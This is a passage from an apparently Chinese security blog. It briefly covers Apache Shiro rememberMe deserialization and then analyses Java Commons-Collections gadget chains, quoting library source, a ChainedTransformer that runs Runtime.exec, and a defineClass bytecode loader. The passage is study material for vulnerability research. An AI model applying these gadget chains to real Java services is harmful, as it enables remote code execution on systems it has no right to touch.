<p>修复即去掉了默认的<code>key</code></p>
</li>
<li><p><code>Shiro-721</code>原理：</p>
<p>同样也是<code>rememberMe</code>字段，不过需要一个合法的<code>rememberMe</code>字段作为前缀</p>
</li>
<li><p>识别：</p>
<ul>
<li><code>Remember Me</code>的功能</li>
<li>抓包的时候在<code>set-cookie</code>中有<code>remeberMe</code>字段</li>
<li>或者<code>key</code>不同导致的信息回传</li>
</ul>
</li>
<li><p>检测：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/search?q=shiroscan</span><br></pre></td></tr></table></div></figure></li>
<li><p>利用：</p>
<p>很多种类，用<code>ysoserial</code>吧，需要去掉<code>JSESSIONID</code>字段，具体的可以看看<code>vulhub</code>中讲到的方法。</p>
</li>
</ul>
<p>▲注：</p>
<p>自己本地调试<code>shiro-550</code>的时候，老是没办法反序列化，执行到反序列化时，即最终的<code>DefaultSerializer.java  -  deserialize</code>函数中就会抛出异常，直接跳转到异常处理去，应该是环境搭建有点问题。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221118112528568.png" alt="image-20221118112528568"></p>

        <h3 id="7-Redis"   >
          <a href="#7-Redis" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-Redis" class="headerlink" title="7.Redis"></a>7.Redis</h3>
      <ul>
<li>端口：6379</li>
</ul>

        <h1 id="TIPS"   >
          <a href="#TIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1>
      
        <h2 id="1-目录穿越"   >
          <a href="#1-目录穿越" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-目录穿越" class="headerlink" title="1.目录穿越"></a>1.目录穿越</h2>
      <p><code>../</code>约等于<code>&#123;.&#125;</code></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/07/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC/">JAVA反序列化CC链笔记</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-07-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-08-10</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="前置说明"   >
          <a href="#前置说明" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置说明" class="headerlink" title="前置说明"></a>前置说明</h1>
      <p>依据这张图来进行一些分析</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1535" >Commons-Collections 1-7 利用链分析 – 天下大木头 (wjlshare.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/DF8C7E9CED07CAD7321EFED262F23E20.png" alt="DF8C7E9CED07CAD7321EFED262F23E20"></p>

        <h1 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1>
      <p>CC链包含了好多的<code>Transformer</code>，这部分知识在<code>P</code>神的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings" >JAVA安全漫谈</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中讲的挺清楚的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/548841448822424" >Java安全漫谈 - 09.反序列化篇(3)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，简单提一下</p>

        <h2 id="源码-8u40"   >
          <a href="#源码-8u40" class="heading-link"><i class="fas fa-link"></i></a><a href="#源码-8u40" class="headerlink" title="源码-8u40"></a>源码-8u40</h2>
      
        <h2 id="Transformer"   >
          <a href="#Transformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2>
      <p><code>Transformer</code>是⼀个接⼝，代表调用该对象的<code>transform</code>方法</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>很多的<code>transformer</code>系列对象都实现了该接口，并且进行重写，比如熟悉的像<code>InvokerTransformer</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="TransformedMap"   >
          <a href="#TransformedMap" class="heading-link"><i class="fas fa-link"></i></a><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2>
      <p>借用一下<code>p</code>神在<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings" >JAVA安全漫谈</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/548841448822424" >Java安全漫谈 - 09.反序列化篇(3)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>下的原话</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802181051056.png" alt="image-20220802181051056"></p>
<p>这里的<strong>回调</strong>感觉就是调用对应实现了<code>Transformer</code>接口的类的自定义的<code>transform</code>方法。</p>
<p>其源码如下：</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7023152376788900464L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>由于其构造函数是<code>protected</code>修饰的，所以通常是没办法在我们的代码中直接实例化对象出来的，那么就利用提供的<code>decorate</code>函数接口即可。</p>

        <h2 id="ConstantTransformer"   >
          <a href="#ConstantTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2>
      <p>看源码就知道</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6374440726369055124L</span>;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>即构造函数的时候传入⼀个对象，当调用<code>transform</code>方法时再将这个对象返回，最开始我想着这不是多此一举吗，有什么用捏。后面才知道，这可能就是为了传递某些无法进行序列化的类吧，比如<code>Runtime</code>的。</p>

        <h2 id="InvokerTransformer"   >
          <a href="#InvokerTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2>
      <p>这个可以说是很关键的一个类了，能执行任意方法。看下源码，主要关注三个参数的构造函数和<code>transform</code>函数。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span>&#123;</span><br><span class="line">                <span class="comment">//.....</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>即当调用到该类的<code>transform</code>函数时，约等于执行<code>input.iMethodName(this.iArgs)</code>。</p>

        <h2 id="ChainedTransformer"   >
          <a href="#ChainedTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2>
      <p>包含了一个<code>Transformer</code>的数组，即数组中前⼀个<code>Transformer</code>的<code>transform</code>函数执行的返回结果，作为后⼀个<code>Transformer</code>的<code>transform</code>函数的参数输入</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>比如如下在反序列化中常见的执行<code>Runtime.exec</code>的方法</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch dddd&quot;</span>&#125;)&#125;);</span><br><span class="line">chain.transform(<span class="number">123</span>);<span class="comment">//这个123没啥用,随便设置</span></span><br></pre></td></tr></table></div></figure>

<p>那么实际的的调用链如下，实际调试一下应该更清楚一些。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE.png" alt="未命名绘图"></p>
<p>所以通常情况下，我们就是需要找到能调用到某个对象的<code>transform</code>函数的链子。</p>

        <h2 id="TemplatesImpl"   >
          <a href="#TemplatesImpl" class="heading-link"><i class="fas fa-link"></i></a><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2>
      <p>这个不知道被设计出来干啥的，不过在<code>JAVA</code>反序列化中通常用来加载字节码。</p>

        <h3 id="前置知识-1"   >
          <a href="#前置知识-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/815544582812412" >Java安全漫谈 - 13.Java中动态加载字节码的那些方法</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><code>JAVA</code>虚拟机<code>JVM</code>实际加载运行的是<code>.class</code>文件，而这个<code>.class</code>文件，里面的实际数据就是字节码。那么如果我们可以自定义一个类，其构造函数为打印<code>Hello World</code>，然后将之编译成<code>.class</code>文件，然后让<code>JAVA</code>去加载，就可以触发该类的构造函数了。</p>
<p>那么这个加载<code>.class</code>文件的方法，就是<code>defineClass</code>，以下就是p神提供的一个例子，运行会打印出<code>Hello World</code>。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class,<span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);</span><br><span class="line">        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>那么我们需要寻找的链子，就是能够调用到<code>defineClass</code>方法的链子，这里就是<code>TemplatesImpl</code>，其调用链如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.newTransformer() -&gt;TemplatesImpl.getTransletInstance() -&gt; TemplatesImpl.defineTransletClasses()-&gt; TransletClassLoader.defineClass()</span><br></pre></td></tr></table></div></figure>

<p>相关实际调用截图如下</p>

        <h3 id="链子"   >
          <a href="#链子" class="heading-link"><i class="fas fa-link"></i></a><a href="#链子" class="headerlink" title="链子"></a>链子</h3>
      
        <h4 id="TemplatesImpl-newTransformer"   >
          <a href="#TemplatesImpl-newTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer()"></a>TemplatesImpl.newTransformer()</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171708570.png" alt="image-20220803171708570"></p>

        <h4 id="TemplatesImpl-defineTransletClasses"   >
          <a href="#TemplatesImpl-defineTransletClasses" class="heading-link"><i class="fas fa-link"></i></a><a href="#TemplatesImpl-defineTransletClasses" class="headerlink" title="TemplatesImpl.defineTransletClasses()"></a>TemplatesImpl.defineTransletClasses()</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171741367.png" alt="image-20220803171741367"></p>

        <h4 id="TransletClassLoader-defineClass"   >
          <a href="#TransletClassLoader-defineClass" class="heading-link"><i class="fas fa-link"></i></a><a href="#TransletClassLoader-defineClass" class="headerlink" title="TransletClassLoader.defineClass()"></a>TransletClassLoader.defineClass()</h4>
      <p>这里的<code>_bytecodes[i]</code>即为<code>TemplatesImpl</code>类中私有成员，我们可以通过反射来为其赋值。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171936516.png" alt="image-20220803171936516"></p>

        <h2 id="TrAXFilter"   >
          <a href="#TrAXFilter" class="heading-link"><i class="fas fa-link"></i></a><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h2>
      <p>该类未实现<code>Serializable</code>接口，无法进行序列化，所以使用的时候通常结合<code>ConstantTransformer</code>来搭配使用。主要关注其构造函数</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrAXFilter</span> <span class="keyword">extends</span> <span class="title">XMLFilterImpl</span> </span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">private</span> TransformerImpl        _transformer;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">        TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>即会依据传入的<code>Templates</code>类对象，来调用其<code>newTransformer</code>函数，这个是不是就是可以调用到之前提到的<code>TransformerImpl.newTransformer()</code>从而加载字节码呢。</p>

        <h2 id="InstantiateTransformer"   >
          <a href="#InstantiateTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2>
      <p>同样也是一个实现了<code>Transformer</code>接口的类，主要关注其构造函数和重写的<code>transform</code>函数</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstantiateTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InstantiateTransformer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="keyword">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) 